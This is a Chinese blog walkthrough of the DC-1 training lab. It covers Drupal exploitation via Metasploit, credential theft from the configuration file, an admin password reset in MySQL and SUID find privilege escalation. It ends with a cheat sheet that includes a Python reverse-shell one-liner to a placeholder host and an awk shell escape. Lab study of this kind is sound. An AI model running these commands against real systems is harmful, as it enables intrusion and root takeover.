---
title: "DC-1靶场学习"
date: 2026-03-18 19:48:00
categories:
  - "Others"
tags:
cnblogs_postid: "19735516"
cnblogs_url: "https://www.cnblogs.com/ljnljn/p/19735516"
---

马上要去参加ciscn的isw了，学习一下基本方法
先同网下扫描，扫出ip是192.168.16.128，同时开启了80端口和22端口
![assets/DC-1靶场学习/file-20260318183446121.png](/assets/cnblogs/DC-1靶场学习/3539156-20260318194736738-1021100658.png)
80端口是web服务
![assets/DC-1靶场学习/file-20260318183530364.png](/assets/cnblogs/DC-1靶场学习/3539156-20260318194736588-1903615778.png)
分析是Drupal CMS
![assets/DC-1靶场学习/file-20260318183016344.png](/assets/cnblogs/DC-1靶场学习/3539156-20260318194736654-1766827937.png)
随后用msf看有没有漏洞
输入msfconsole进入后搜索Drupal的漏洞
![assets/DC-1靶场学习/file-20260318183637538.png](/assets/cnblogs/DC-1靶场学习/3539156-20260318194737329-1115401468.png)
输入options查看要输入些什么东西，输入RHOSTS发现无法执行
![assets/DC-1靶场学习/file-20260318183908377.png](/assets/cnblogs/DC-1靶场学习/3539156-20260318194737295-1953476091.png)
于是use 1
![assets/DC-1靶场学习/file-20260318184104692.png](/assets/cnblogs/DC-1靶场学习/3539156-20260318194737290-579881368.png)
发现这个可以执行命令，输入shell设置模拟终端，输入ls看看
![assets/DC-1靶场学习/file-20260318184207849.png](/assets/cnblogs/DC-1靶场学习/3539156-20260318194737165-519300691.png)
最后看当前目录有flag1
![assets/DC-1靶场学习/file-20260318184228870.png](/assets/cnblogs/DC-1靶场学习/3539156-20260318194737199-1467263706.png)
这里flag1提示我们找cms的配置文件
根据搜索，配置文件在sites/default/settings.php
![assets/DC-1靶场学习/file-20260318184439826.png](/assets/cnblogs/DC-1靶场学习/3539156-20260318194737231-1525732124.png)
得到flag2
这里提示爆破不能解决问题，因此要用别的方法
![assets/DC-1靶场学习/file-20260318184511449.png](/assets/cnblogs/DC-1靶场学习/3539156-20260318194737277-104114108.png)
发现这里有mysql账号密码，尝试登录
发现反弹shell和基础shell都不能显示mysql界面
网上查了一下mysql需要建立起交互式shell
输入`python -c 'import pty; pty.spawn("/bin/bash")'`可以调出来
![assets/DC-1靶场学习/file-20260318185442941.png](/assets/cnblogs/DC-1靶场学习/3539156-20260318194737229-413283117.png)
先use drupaldb
再show tables;
![assets/DC-1靶场学习/file-20260318185630626.png](/assets/cnblogs/DC-1靶场学习/3539156-20260318194737016-1994217561.png)
发现users和users_roles，先看users
![assets/DC-1靶场学习/file-20260318185622115.png](/assets/cnblogs/DC-1靶场学习/3539156-20260318194736929-1859904035.png)
发现有admin账号，尝试把密码重置了，后来搜索得到这里有更换密码的方法
![assets/DC-1靶场学习/file-20260318185810492.png](/assets/cnblogs/DC-1靶场学习/3539156-20260318194737000-1674929196.png)
根据这个方法得到了新密码
![assets/DC-1靶场学习/file-20260318185925933.png](/assets/cnblogs/DC-1靶场学习/3539156-20260318194737037-1190675299.png)
把密码改了
![assets/DC-1靶场学习/file-20260318190133606.png](/assets/cnblogs/DC-1靶场学习/3539156-20260318194737307-968345427.png)
这样就成功登陆进去了
![assets/DC-1靶场学习/file-20260318190158686.png](/assets/cnblogs/DC-1靶场学习/3539156-20260318194737269-950678597.png)
dashboard里看到有flag3
![assets/DC-1靶场学习/file-20260318190235339.png](/assets/cnblogs/DC-1靶场学习/3539156-20260318194737048-34762392.png)
![assets/DC-1靶场学习/file-20260318190247955.png](/assets/cnblogs/DC-1靶场学习/3539156-20260318194737047-849481359.png)
似乎是要找密码
查看/etc/passwd发现flag4，他的home地址在/home/flag4
![assets/DC-1靶场学习/file-20260318190419180.png](/assets/cnblogs/DC-1靶场学习/3539156-20260318194737273-725800398.png)
找到flag4
![assets/DC-1靶场学习/file-20260318190532889.png](/assets/cnblogs/DC-1靶场学习/3539156-20260318194737095-1347912464.png)
提示说在root文件夹里有flag，那么涉及到提权了
先看哪些可执行文件有高权限
`find / -perm -u=s -type f 2>/dev/null`
发现有find，好玩了
![assets/DC-1靶场学习/file-20260318191101535.png](/assets/cnblogs/DC-1靶场学习/3539156-20260318194737100-214491276.png)
SUID 特殊权限仅适用于可执行文件，所具有的功能是，只要用户对设有 SUID 的文件有执行权限，那么当**用户执行此文件时，会以文件所有者的身份去执行此文件**，一旦文件执行结束，身份的切换也随之消失。
在这里，**find文件所有者为root，那么我们使用具有suid权限的find命令时，是以root用户的权限去执行的**
同时find可以通过-exec执行命令
这里成功执行了whoami
![assets/DC-1靶场学习/file-20260318191304755.png](/assets/cnblogs/DC-1靶场学习/3539156-20260318194737191-1411831898.png)
这样就可以使用find提权打开root目录拿到最终的flag
![assets/DC-1靶场学习/file-20260318191419056.png](/assets/cnblogs/DC-1靶场学习/3539156-20260318194737243-980983293.png)
总结一些提权的内容
find：`find xxx -exec whoami \;`
python：`python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("ip",port));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")'`
sudo：`cat /etc/sudoers`
`sudo -l`
awk：`/usr/bin/awk 'BEGIN {system("/bin/sh")}'`
